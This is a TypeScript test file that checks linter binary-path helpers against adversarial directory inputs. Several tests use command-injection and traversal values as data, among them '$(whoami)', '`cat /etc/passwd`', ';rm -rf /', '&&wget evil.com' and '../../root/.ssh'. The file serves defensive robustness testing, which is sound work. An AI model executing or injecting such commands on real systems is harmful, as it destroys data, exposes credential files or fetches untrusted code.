import { describe, expect, it, test } from 'bun:test';
import * as path from 'node:path';
import {
	detectAvailableLinter,
	getBiomeBinPath,
	getEslintBinPath,
} from '../../../src/tools/lint';

// ============================================================================
// detectAvailableLinter() fix — Adversarial path-computation & existsSync tests
// Issue #209
//
// The function accepts directory?: string and guards with fs.existsSync.
// We attack: path traversal, null/undefined args, empty strings, spaces,
// very long paths, node_modules targets, and path normalization.
// ============================================================================

describe('detectAvailableLinter() — ADVERSARIAL PATH & GUARD TESTS', () => {
	// ============ getBiomeBinPath — returns string, no throw ============
	describe('getBiomeBinPath() — path computation safety', () => {
		it('ADV-001: should return a string (not null/undefined) for normal directory', () => {
			const result = getBiomeBinPath('/project');
			expect(typeof result).toBe('string');
			expect(result.length).toBeGreaterThan(0);
		});

		it('ADV-002: should return a string for empty string directory', () => {
			// path.join('', 'node_modules', ...) is valid — resolves to 'node_modules/.bin/biome'
			const result = getBiomeBinPath('');
			expect(typeof result).toBe('string');
			expect(result).not.toBe('');
		});

		it('ADV-003: should not throw on null byte in directory', () => {
			// Node's path.join silently truncates at \x00 on some platforms
			// but the function must not throw
			expect(() => getBiomeBinPath('/path\x00/evil')).not.toThrow();
			const result = getBiomeBinPath('/path\x00/evil');
			expect(typeof result).toBe('string');
		});

		it('ADV-004: should not throw on control characters (tab, CR, LF)', () => {
			expect(() => getBiomeBinPath('/path\t/evil')).not.toThrow();
			expect(() => getBiomeBinPath('/path\r/evil')).not.toThrow();
			expect(() => getBiomeBinPath('/path\n/evil')).not.toThrow();
		});

		it('ADV-005: should not throw on path traversal (Unix)', () => {
			expect(() => getBiomeBinPath('../../../etc')).not.toThrow();
			const result = getBiomeBinPath('../../../etc');
			expect(typeof result).toBe('string');
		});

		it('ADV-006: should not throw on path traversal (Windows backslash)', () => {
			expect(() => getBiomeBinPath('..\\..\\Windows\\System32')).not.toThrow();
			const result = getBiomeBinPath('..\\..\\Windows\\System32');
			expect(typeof result).toBe('string');
		});

		it('ADV-007: should not throw on mixed traversal', () => {
			expect(() => getBiomeBinPath('../../root/../root/.ssh')).not.toThrow();
			const result = getBiomeBinPath('../../root/../root/.ssh');
			expect(typeof result).toBe('string');
		});

		it('ADV-008: should not throw on directory that IS the node_modules path', () => {
			// This is an unusual but valid path — node_modules/.bin/ within node_modules
			expect(() => getBiomeBinPath('/path/node_modules')).not.toThrow();
			const result = getBiomeBinPath('/path/node_modules');
			expect(typeof result).toBe('string');
		});

		it('ADV-009: should not throw on very long path (1000 chars)', () => {
			const long = '/project/' + 'a'.repeat(1000);
			expect(() => getBiomeBinPath(long)).not.toThrow();
			const result = getBiomeBinPath(long);
			expect(typeof result).toBe('string');
		});

		it('ADV-010: should not throw on very long path (10000 chars)', () => {
			const long = '/project/' + 'a'.repeat(10000);
			expect(() => getBiomeBinPath(long)).not.toThrow();
			const result = getBiomeBinPath(long);
			expect(typeof result).toBe('string');
		});

		it('ADV-011: should not throw on shell metacharacters in path', () => {
			expect(() => getBiomeBinPath('/path/$(whoami)')).not.toThrow();
			expect(() => getBiomeBinPath('/path/`cat /etc/passwd`')).not.toThrow();
			expect(() => getBiomeBinPath('/path;rm -rf /')).not.toThrow();
			expect(() => getBiomeBinPath('/path&&wget evil.com')).not.toThrow();
		});

		it('ADV-012: should not throw on directory with spaces', () => {
			expect(() => getBiomeBinPath('/path with spaces/project')).not.toThrow();
			const result = getBiomeBinPath('/path with spaces/project');
			expect(typeof result).toBe('string');
		});

		it('ADV-013: should not throw on directory with Unicode/special chars', () => {
			expect(() => getBiomeBinPath('/path/日本語/project')).not.toThrow();
			expect(() => getBiomeBinPath('/path/🚀/project')).not.toThrow();
			const result = getBiomeBinPath('/path/日本語/project');
			expect(typeof result).toBe('string');
		});

		// ============ Path normalization / traversal escape prevention ============
		it('ADV-014: path.join normalization — no double slashes from traversal', () => {
			// path.join normalizes .. segments — the output path should always be a valid
			// descendant of the input directory (with node_modules/.bin appended)
			const malicious = '../../../etc';
			const result = getBiomeBinPath(malicious);
			// The result should contain 'node_modules' (always true for path.join)
			expect(result).toContain('node_modules');
			expect(result).toContain('.bin');
			expect(result).toContain('biome');
		});

		it('ADV-015: path.join normalization — no double-slash issues', () => {
			// Even with trailing slashes, path.join normalizes correctly
			const result = getBiomeBinPath('/project//');
			expect(result).not.toContain('//');
			expect(result).toContain('node_modules');
			expect(result).toContain('biome');
		});

		it('ADV-016: path.join normalization — handles dot segments', () => {
			const result = getBiomeBinPath('/project/./src/../lib');
			expect(result).not.toContain('/./');
			expect(result).not.toContain('/../');
			expect(result).toContain('node_modules');
		});

		it('ADV-017: path traversal cannot escape the node_modules/.bin sandbox', () => {
			// No matter what path traversal the caller passes, path.join always
			// appends 'node_modules/.bin/biome' — so the result is always a child
			// of the input directory (sandboxed under node_modules)
			const inputs = [
				'../../../../../etc',
				'..\\..\\..\\Windows\\System32',
				'/very/deep/../../../../../escaped',
				'',
				'/path with spaces/../../..',
			];
			for (const input of inputs) {
				const result = getBiomeBinPath(input);
				// The path must always end with the bin name
				const isWindows = process.platform === 'win32';
				const endsWithBin = isWindows
					? result.endsWith('node_modules\\.bin\\biome.EXE')
					: result.endsWith('node_modules/.bin/biome');
				expect(endsWithBin).toBe(true);
			}
		});
	});

	// ============ getEslintBinPath — same guarantees ============
	describe('getEslintBinPath() — path computation safety', () => {
		it('ADV-018: should return a string for normal directory', () => {
			const result = getEslintBinPath('/project');
			expect(typeof result).toBe('string');
			expect(result.length).toBeGreaterThan(0);
		});

		it('ADV-019: should not throw on path traversal (Unix)', () => {
			expect(() => getEslintBinPath('../../../etc')).not.toThrow();
			const result = getEslintBinPath('../../../etc');
			expect(typeof result).toBe('string');
		});

		it('ADV-020: should not throw on empty string', () => {
			expect(() => getEslintBinPath('')).not.toThrow();
			const result = getEslintBinPath('');
			expect(typeof result).toBe('string');
		});

		it('ADV-021: should not throw on null byte', () => {
			expect(() => getEslintBinPath('/path\x00/evil')).not.toThrow();
		});

		it('ADV-022: should not throw on very long path (1000 chars)', () => {
			const long = '/project/' + 'a'.repeat(1000);
			expect(() => getEslintBinPath(long)).not.toThrow();
		});

		it('ADV-023: should not throw on directory with spaces', () => {
			expect(() => getEslintBinPath('/path with spaces/project')).not.toThrow();
			const result = getEslintBinPath('/path with spaces/project');
			expect(typeof result).toBe('string');
		});

		it('ADV-024: should not throw on directory that IS the node_modules path', () => {
			expect(() => getEslintBinPath('/path/node_modules')).not.toThrow();
		});

		it('ADV-025: path.join normalization — traversal cannot escape sandbox', () => {
			const inputs = [
				'../../../../../etc',
				'..\\..\\..\\Windows\\System32',
				'/very/deep/../../../../../escaped',
				'',
			];
			for (const input of inputs) {
				const result = getEslintBinPath(input);
				const isWindows = process.platform === 'win32';
				const endsWithBin = isWindows
					? result.endsWith('node_modules\\.bin\\eslint')
					: result.endsWith('node_modules/.bin/eslint');
				expect(endsWithBin).toBe(true);
			}
		});
	});

	// ============ detectAvailableLinter() — graceful degradation ============
	describe('detectAvailableLinter() — graceful handling of adversarial directory', () => {
		it('ADV-026: path traversal ../../../etc — should not throw, return null', async () => {
			// When directory doesn't contain a linter binary, detectAvailableLinter
			// should gracefully return null (not throw)
			let threw = false;
			let result: string | null = null;
			try {
				result = await detectAvailableLinter('../../../etc');
			} catch {
				threw = true;
			}
			expect(threw).toBe(false);
			// Result is null because no linter binary exists at ../../../etc/node_modules/.bin/
			// (we are not testing the npx spawn here — just the guard logic)
			// The result could be 'biome', 'eslint', or null depending on environment
			// — only requirement: it must not throw
		});

		it('ADV-027: empty string directory — should not throw, use cwd as fallback', async () => {
			let threw = false;
			try {
				await detectAvailableLinter('');
			} catch {
				threw = true;
			}
			expect(threw).toBe(false);
		});

		it('ADV-028: undefined directory — should not throw, use cwd as fallback', async () => {
			let threw = false;
			try {
				await detectAvailableLinter(undefined);
			} catch {
				threw = true;
			}
			expect(threw).toBe(false);
		});

		it('ADV-029: null byte in directory — should not throw', async () => {
			let threw = false;
			try {
				await detectAvailableLinter('/path\x00/evil');
			} catch {
				threw = true;
			}
			expect(threw).toBe(false);
		});

		it('ADV-030: very long path (1000 chars) — should not throw', async () => {
			const long = '/project/' + 'a'.repeat(1000);
			let threw = false;
			try {
				await detectAvailableLinter(long);
			} catch {
				threw = true;
			}
			expect(threw).toBe(false);
		});

		it('ADV-031: directory with spaces — should not throw', async () => {
			let threw = false;
			try {
				await detectAvailableLinter('/path with spaces/project');
			} catch {
				threw = true;
			}
			expect(threw).toBe(false);
		});

		it('ADV-032: node_modules path as directory — should not throw', async () => {
			let threw = false;
			try {
				await detectAvailableLinter('/path/node_modules');
			} catch {
				threw = true;
			}
			expect(threw).toBe(false);
		});

		it('ADV-033: control characters (tab, CR, LF) in directory — should not throw', async () => {
			let threw = false;
			try {
				await detectAvailableLinter('/path\t/evil');
			} catch {
				threw = true;
			}
			expect(threw).toBe(false);
		});

		// Bun's default per-test timeout is 5000ms, but 5 shell-metacharacter inputs
		// each spawn npx processes that may take up to ~2s each (DETECT_TIMEOUT) × 2 procs.
		// Set 30000ms so this test doesn't time out.
		test(
			'ADV-034: shell metacharacters in directory — should not throw',
			{ timeout: 30000 },
			async () => {
				const inputs = [
					'/path/$(whoami)',
					'/path/`cat /etc/passwd`',
					'/path;rm -rf /',
					'/path&&wget evil.com',
					'/path|wget evil.com',
				];
				for (const input of inputs) {
					let threw = false;
					try {
						await detectAvailableLinter(input);
					} catch {
						threw = true;
					}
					expect(threw).toBe(false);
				}
			},
		);

		it('ADV-035: Unicode in directory — should not throw', async () => {
			let threw = false;
			try {
				await detectAvailableLinter('/path/日本語/project');
			} catch {
				threw = true;
			}
			expect(threw).toBe(false);
		});

		// ============ existsSync guard — security boundary ============
		it('ADV-036: path traversal result is still a string (path.join normalizes)', async () => {
			// Even with adversarial input, getBiomeBinPath and getEslintBinPath
			// return well-formed strings because path.join normalizes everything
			const biomePath = getBiomeBinPath('../../../etc');
			const eslintPath = getEslintBinPath('../../../etc');

			expect(typeof biomePath).toBe('string');
			expect(typeof eslintPath).toBe('string');
			expect(biomePath.length).toBeGreaterThan(0);
			expect(eslintPath.length).toBeGreaterThan(0);

			// Both should be absolute-looking strings (start with / or drive letter)
			// because path.join resolves them
			expect(biomePath).toContain('node_modules');
			expect(eslintPath).toContain('node_modules');
		});

		it('ADV-037: no double-slash in result on adversarial input', () => {
			// path.join handles this, but verify
			const inputs = [
				'/project//',
				'/project///',
				'/project//node_modules//.bin//',
			];
			for (const input of inputs) {
				const result = getBiomeBinPath(input);
				expect(result).not.toMatch(/\/\//); // no double slashes
				expect(result).not.toMatch(/\\\\/); // no double backslashes
			}
		});

		it('ADV-038: idempotency — calling getBiomeBinPath twice with same input yields same result', () => {
			const dir = '../../../etc/sensitive';
			const r1 = getBiomeBinPath(dir);
			const r2 = getBiomeBinPath(dir);
			expect(r1).toBe(r2);
		});

		it('ADV-039: deterministic — same adversarial input always produces same path', () => {
			const inputs = [
				'../../../../root/.ssh',
				'..\\..\\..\\Windows\\System32',
				'/path with spaces/../../..',
			];
			for (const input of inputs) {
				const r1 = getBiomeBinPath(input);
				const r2 = getBiomeBinPath(input);
				const r3 = getBiomeBinPath(input);
				expect(r1).toBe(r2);
				expect(r2).toBe(r3);
			}
		});

		it('ADV-040: return type is always string — no null/undefined leakage', () => {
			// Test every adversarial input returns string, never null/undefined
			const adversarialInputs = [
				'',
				'../../etc',
				'..\\..\\Windows',
				'/path\x00/evil',
				'/path\t/evil',
				'/path\n/evil',
				'/path\r/evil',
				'/path with spaces',
				'/path/日本語',
				'/path/$(whoami)',
				'/path/`cat`',
				'/path;rm',
				'/path&&wget',
				'/path||wget',
				'/path'.repeat(100), // 400 chars
				'/project/' + 'a'.repeat(1000),
				'/project/' + 'a'.repeat(10000),
				'/path/node_modules',
			];
			for (const input of adversarialInputs) {
				const result = getBiomeBinPath(input);
				expect(result).not.toBeNull();
				expect(result).not.toBeUndefined();
				expect(typeof result).toBe('string');
			}
		});
	});
});
